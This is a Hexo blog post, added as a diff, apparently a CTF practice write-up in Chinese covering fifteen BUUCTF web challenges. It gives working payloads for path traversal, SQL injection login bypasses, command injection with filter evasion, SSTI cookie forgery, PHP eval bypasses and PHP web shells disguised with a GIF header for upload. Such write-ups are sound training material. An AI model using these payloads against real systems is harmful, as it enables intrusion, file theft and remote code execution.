@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"jingdaqiang.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="坦白说，第一次刷题感觉不是很好，边做边看WP太low了，不可能提升，很多东西没吸收，好多payload都是复制粘贴，所以二刷，想把之前丢掉的知识捡回来，系统地学习 [HCTF 2018]WarmUp两个php文件，hint.php提示flag在ffffllllaaaagggg代码审计：白名单，传入值在白名单里， $_page &#x3D; mb_substr(&#x2F;&#x2F;mb_substr() 函数返回字符串的一部">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buu1-16">
+<meta property="og:url" content="https://jingdaqiang.github.io/2021/03/07/buu1-16/index.html">
+<meta property="og:site_name" content="Tube.D@q1an9">
+<meta property="og:description" content="坦白说，第一次刷题感觉不是很好，边做边看WP太low了，不可能提升，很多东西没吸收，好多payload都是复制粘贴，所以二刷，想把之前丢掉的知识捡回来，系统地学习 [HCTF 2018]WarmUp两个php文件，hint.php提示flag在ffffllllaaaagggg代码审计：白名单，传入值在白名单里， $_page &#x3D; mb_substr(&#x2F;&#x2F;mb_substr() 函数返回字符串的一部">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-03-07T08:58:29.000Z">
+<meta property="article:modified_time" content="2021-03-07T12:54:03.343Z">
+<meta property="article:author" content="六公子买单">
+<meta property="article:tag" content="二刷buu">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://jingdaqiang.github.io/2021/03/07/buu1-16/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>buu1-16 | Tube.D@q1an9</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Tube.D@q1an9</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/07/buu1-16/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tube.D@q1an9">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          buu1-16
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-07 16:58:29 / Modified: 20:54:03" itemprop="dateCreated datePublished" datetime="2021-03-07T16:58:29+08:00">2021-03-07</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>坦白说，第一次刷题感觉不是很好，边做边看WP太low了，不可能提升，很多东西没吸收，好多payload都是复制粘贴，所以二刷，想把之前丢掉的知识捡回来，系统地学习</p>
+<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>两个php文件，hint.php提示flag在ffffllllaaaagggg<br>代码审计：<br>白名单，传入值在白名单里，</p>
+<pre><code>$_page = mb_substr(//mb_substr() 函数返回字符串的一部分
+$page,
+0,//从0开始截取
+mb_strpos($page . &#39;?&#39;, &#39;?&#39;)//strpos()函数查找字符串在另一字符串中第一次出现的位置（区分大小写）
+);//两个函数组合起来的意思是返回page从开始到?的字符串
+if (in_array($_page, $whitelist)) &#123;
+return true;//要求截取的字符串在白名单内，所以source,php和hint.php都可以
+&#125;</code></pre>
+<p>构造payloda:?file=hint.php?../../../../../ffffllllaaaagggg<br>(一开始flag不在当前目录，要用../进行目录跳转)</p>
+<hr>
+<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码登录：1’or’1’=’1</p>
+<hr>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>1回显，1’不回显，1’ #显示正常字符型注入<br>（1’ or 1=1 #爆出该表中所有字段）<br>order by 2,2个字段<br>select被过滤，用堆叠注入（注意每小段语句后都要加；）<br>查表：</p>
+<pre><code>1&#39;;show tables;返回1919810931114514与words  </code></pre>
+<p>查列：（引表名用反引号）</p>
+<pre><code>1&#39;;show columns from `1919810931114514`</code></pre>
+<p>查字段<br>到此，发现回显内容在words表（输入1，回显的是words的内容），flag在1919810931114514表<br>不能用select，否则可以直接查1919810931114514表  </p>
+<ul>
+<li>3个骚方法：预编译，handler查询，修改表名和列名<br>写过，不赘述了。</li>
+<li>再敲一遍</li>
+</ul>
+<hr>
+<h2 id="极客大挑战-2019-Havefun-1"><a href="#极客大挑战-2019-Havefun-1" class="headerlink" title="[极客大挑战 2019]Havefun 1"></a>[极客大挑战 2019]Havefun 1</h2><p>源码，get传参</p>
+<hr>
+<h2 id="ACTF2020-新生赛-Include-1"><a href="#ACTF2020-新生赛-Include-1" class="headerlink" title="[ACTF2020 新生赛]Include 1"></a>[ACTF2020 新生赛]Include 1</h2><p>php://filter协议<br>?file=php://filter/read=convert.base64-encode/resource=flag.php </p>
+<hr>
+<h2 id="极客大挑战-2019-Secret-File-1"><a href="#极客大挑战-2019-Secret-File-1" class="headerlink" title="[极客大挑战 2019]Secret File 1"></a>[极客大挑战 2019]Secret File 1</h2><p>抓包，得php，代码审计，get传参<br>strstr(“Hello world!”,”world”);  // 输出 world!<br>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE<br>该函数是区分大小写的。如需进行不区分大小写的搜索，请使用 stristr() 函数。  </p>
+<pre><code>if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))  </code></pre>
+<p>过滤了目录穿越，和几个php伪协议,没过滤php://filter协议<br>?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<hr>
+<h2 id="极客大挑战-2019-LoveSQL-1"><a href="#极客大挑战-2019-LoveSQL-1" class="headerlink" title="[极客大挑战 2019]LoveSQL 1"></a>[极客大挑战 2019]LoveSQL 1</h2><p>先登录，万能密码  ?username=admin%27%23&amp;password=1即可登陆成功<br>最常规的Union联合查询</p>
+<hr>
+<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>?ip=127.0.0.1 | ls查目录，发现空格被过滤</p>
+<p>绕过方法：<br>$IFS<br>${IFS}<br>$IFS$数字<br>&lt;<br>&lt;&gt;<br>绕过后查取目录出现flag.php和index.php,读取/?ip=127.0.0.1$IFS$9|$IFS$9cat$IFS$9flag.php<br>发现字符flag被过滤，读取index.php查看源码<br>/?ip=<br>|&#39;|&quot;|\|(|)|[|]|{|}/“, $ip, $match)){<br>    echo preg_match(“/&amp;|/|?|*|&lt;|[\x{00}-\x{20}]|&gt;|&#39;|&quot;|\|(|)|[|]|{|}/“, $ip, $match);<br>    die(“fxck your symbol!”);//过滤\右边的符号<br>  } else if(preg_match(“/ /“, $ip)){<br>    die(“fxck your space!”);//过滤空格<br>  } else if(preg_match(“/bash/“, $ip)){<br>    die(“fxck your bash!”);<br>  } else if(preg_match(“/.*f.<em>l.*a.*g.</em>/“, $ip)){<br>    die(“fxck your flag!”);<br>  }<br>  $a = shell_exec(“ping -c 4 “.$ip);<br>  echo “<br>“;<br>  print_r($a);<br>}</p>
+<p>读取flag.php的其他方法</p>
+<h3 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h3><p>payload:<br>?ip=127.0.0.1;echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh<br>(将“cat flag.php”经base64转码得到)</p>
+<h3 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h3><p>index.php代码有一个变量a,可以用变量a代替被过滤的flag中的某个字符，从而绕过flag过滤，进而读取flag<br>/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php</p>
+<h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><pre><code>/?ip=127.0.0.1;cat$IFS$2`ls`</code></pre>
+<p>将反引号内命令的输出结果作为输入来进行命令执行，这样flag.php和index.php的结果都能直接查看（flag在源码中）  </p>
+<hr>
+<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>PING<br>常见管道符命令执行：</p>
+<p>1、|（就是按位或），直接执行|后面的语句</p>
+<p>2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</p>
+<p>3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假</p>
+<p>4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+<p>5、; 前后都执行，无论前面真假，同&amp;，（linux也有）</p>
+<p>法一：用127.0.0.1;ls ../找，../目录穿越，直到127.0.0.1;ls ../../../看到flag,用127.0.0.1;cat ../../../flag读取</p>
+<p>法二：127.0.0.1 | find / -name flag直接找，得/flag,读取：127.0.0.1 | cat /flag</p>
+<hr>
+<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>蚁剑登录，flag在根目录</p>
+<hr>
+<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>考察SSTI(模板注入)<br>tornado是一个python的模板，render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页<br>flag in /fllllllllllllag<br>通过handler.settings对象获取cookie_secret的值，即：<br>handler指向RequestHandler<br>RequestHandler.settings指向self.application.settings<br>所以handler.settings最终指向RequestHandler.application.settings，</p>
+<p>?msg=得到cookie_secret，</p>
+<p>写脚本得到md5(cookie_secret+md5(filename))</p>
+<pre><code>import hashlib
+
+filename = &#39;/fllllllllllllag&#39;
+cookie_secret = &quot;db3053bf-a59d-4f87-bdcb-30e165e0167b&quot;
+tmp = hashlib.md5(filename.encode(encoding=&#39;utf-8&#39;)).hexdigest()
+data = cookie_secret + tmp
+res = hashlib.md5(data.encode(encoding=&#39;utf-8&#39;)).hexdigest()
+print(res)</code></pre>
+<p>?filename=/fllllllllllllag<br>&amp;filehash=3bc0e02c9138512bbd1aa0d86451772e</p>
+<hr>
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>源码提示：calc.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#39;num&#39;]))&#123;&#x2F;&#x2F;不显示num才会包含文件</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#39;echo &#39;.$str.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>有eval()函数，说不定有代码执行漏洞：eval()代码执行漏洞，1,2<br>num传参测试： ？num=123123,可显，数字可显，字母不可显 字母都被WAF拦截，利用PHP的字符串解析特性绕过waf，PHP字符串解析特性。<br><u>由于php在解析url中的参数时，保存前会把num前面的空格去掉再解析，所以在num前加空格可绕过WAF</u>，在num前加个空格，弹出之前代码中的提示，只要在黑名单中，都会提示what are you want to do?<br>可以查phpinfo()<br>payload:      ? num=phpinfo()<br>PHP函数：<br>scandir(“/“)：以数组形式返回指定目录中的文件和目录<br>var_dump()：输出变量的相关信息,显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br>file_get_contents()：把整个文件读入一个字符串中。  </p>
+<ul>
+<li>?%20num=var_dump(scandir(chr(47))): 查看文件目录（“/”被过滤了，可以使用chr(47)来进行表示，进行目录读取）  </li>
+<li>?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))  读取flag  </li>
+</ul>
+<hr>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://www.sycsecret.com&/#39;">https://www.Sycsecret.com&#39;</a><br>加  Referer:<a target="_blank" rel="noopener" href="https://www.sycsecret.com/">https://www.Sycsecret.com</a><br>Please use “Syclover” browser<br>改  User-Agent: Syclover” browser<br>No!!! you can only read this locally!!!<br>加  X-Forwarded-For:127.0.0.1</p>
+<hr>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>备份文件<a target="_blank" rel="noopener" href="http://www.zip有php文件/">www.zip有php文件</a><br>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;class.php&#39;;</span><br><span class="line">$select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">$res&#x3D;unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>传递参数select，res为select反序列化后的值  </p>
+<p>class.php:  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class Name&#123;&#x2F;&#x2F;声明类</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line">                             &#x2F;&#x2F;两个都是私有数据</span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();        &#x2F;&#x2F;password值必须为100，否则die</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;    &#x2F;&#x2F;username值必须为admin</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="[极客大挑战 2019]Upload 1"></a>[极客大挑战 2019]Upload 1</h2><p>文件上传漏洞，要上传图片</p>
+<p>上传普通一句话木马，失败：&lt;?被过滤</p>
+<pre><code>&lt;?php @eval($_POST[&#39;flag&#39;]);?&gt;  </code></pre>
+<p>换个形式，用JS木马，</p>
+<pre><code>&lt;script language=&#39;php&#39;&gt;eval($_POST[flag]);&lt;/script&gt;  </code></pre>
+<p>被检测到不是图片(暴露了)，用文件幻术头绕过</p>
+<pre><code>GIF89a
+&lt;script language=&#39;php&#39;&gt;eval($_POST[flag]);&lt;/script&gt;  </code></pre>
+<p>上传成功，抓包，修改后缀，尝试蚁剑登录<br>但是文件后缀改为php,字符php被过滤，修改为phtml即可上传成功<br>地址为url+upload+文件名<br>根目录找flag</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BA%8C%E5%88%B7buu/" rel="tag"># 二刷buu</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="文件上传">
+      <i class="fa fa-chevron-left"></i> 文件上传
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">1.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="nav-number">2.</span> <span class="nav-text">[极客大挑战 2019]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">3.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-1"><span class="nav-number">4.</span> <span class="nav-text">[极客大挑战 2019]Havefun 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-1"><span class="nav-number">5.</span> <span class="nav-text">[ACTF2020 新生赛]Include 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File-1"><span class="nav-number">6.</span> <span class="nav-text">[极客大挑战 2019]Secret File 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL-1"><span class="nav-number">7.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">8.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sh"><span class="nav-number">8.1.</span> <span class="nav-text">sh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="nav-number">8.2.</span> <span class="nav-text">变量拼接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-number">8.3.</span> <span class="nav-text">内联注释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="nav-number">9.</span> <span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="nav-number">10.</span> <span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-number">11.</span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">12.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="nav-number">13.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="nav-number">14.</span> <span class="nav-text">[极客大挑战 2019]PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload-1"><span class="nav-number">15.</span> <span class="nav-text">[极客大挑战 2019]Upload 1</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">六公子买单</p>
+  <div class="site-description" itemprop="description">一头努力的菜鸟</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">六公子买单</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
